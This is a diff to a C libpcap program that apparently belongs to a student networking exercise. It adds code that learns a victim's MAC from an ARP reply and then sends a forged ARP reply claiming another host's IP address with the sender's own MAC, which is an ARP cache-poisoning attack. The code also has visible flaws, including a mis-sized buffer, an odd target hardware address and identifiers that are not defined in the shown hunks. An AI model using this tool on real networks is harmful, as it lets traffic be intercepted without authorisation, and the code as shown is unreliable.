@@ -9,6 +9,13 @@
 #include <net/if.h>
 #include <netinet/if_ether.h>
 
+#include "dumpcode.h"
+
+#define SRC_MAC 6
+
+#define MAC_SIZE 6
+
+
 typedef struct etherhdr{
   char dstMac[6];
   char srcMac[6];
@@ -28,6 +35,13 @@ typedef struct arphdr_jtj{
   u_char dpa[4];
 } ARPHDR;
 
+char* getMac(u_char *packet, int i) {
+	static char buf[MAC_SIZE] = "";
+    memcpy(buf, packet, 6);
+	return buf;
+}
+
+
 void main(int argc, char **argv)
 {
     pcap_t *handle;					/* Session handle */
@@ -38,6 +52,7 @@ void main(int argc, char **argv)
     bpf_u_int32 net;				/* Our IP */
     struct pcap_pkthdr header;		/* The header that pcap gives us */
     u_char packet[100];			/* The actual packet */
+    char *recvPacket;
 
     char* victim;
     char* target;
@@ -111,6 +126,52 @@ void main(int argc, char **argv)
     memcpy(packet, (void *)&sendHdr, sizeof(sendHdr));
 
     pcap_sendpacket(handle, packet, 60);
+
+    char yourmac[7];
+
+    int chk = 0;
+    while(1) {
+    	chk = pcap_next_ex(handle, &header, &recvPacket);
+		if(chk != 1 ) continue;
+        if(recvPacket[12] == 8 && recvPacket[13] == 6)    {
+            printf("\n%x-%x", recvPacket[20], recvPacket[21]);
+            if(recvPacket[20] == 0 && recvPacket[21] == 2) {
+                dumpcode(recvPacket, 60);
+                memcpy(yourmac, recvPacket + 22, 6);
+                break;
+            }
+        }
+	}
+
+    // printf("%s\n", ether_ntoa((const struct ether_addr*)yourmac));
+
+
+
+    memcpy(sendHdr.eh.dstMac, yourmac, 6);
+    memcpy(sendHdr.eh.srcMac, srcMac, 6);
+    memcpy(sendHdr.eh.etherType, "\x08\x06", 2); // ARP
+
+    memcpy(sendHdr.ht, "\x00\x01", 2);
+    memcpy(sendHdr.pt, "\x08\x00", 2);
+    memcpy(sendHdr.hal, "\x06", 1);
+    memcpy(sendHdr.pal, "\x04", 1);
+    memcpy(sendHdr.op, "\x00\x02", 2); // OPCODE
+
+    memcpy(sendHdr.dha, srcMac, 6);
+
+    inet_pton(AF_INET, argv[2], &iaddr.s_addr);
+    memcpy(sendHdr.dpa, &iaddr.s_addr, 4); //C0A8EE82 // "\xc0\xa8\x20\xfe"
+
+    memcpy(sendHdr.sha, my_mac, 6);
+
+    inet_pton(AF_INET, argv[3], &iaddr.s_addr);
+    memcpy(sendHdr.spa, &iaddr.s_addr, 4); // "\xc0\xa8\x20\x01"
+
+    memset(packet, 0x00, 100);
+    memcpy(packet, (void *)&sendHdr, sizeof(sendHdr));
+
+    pcap_sendpacket(handle, packet, 60);
+
 
     return;
 }
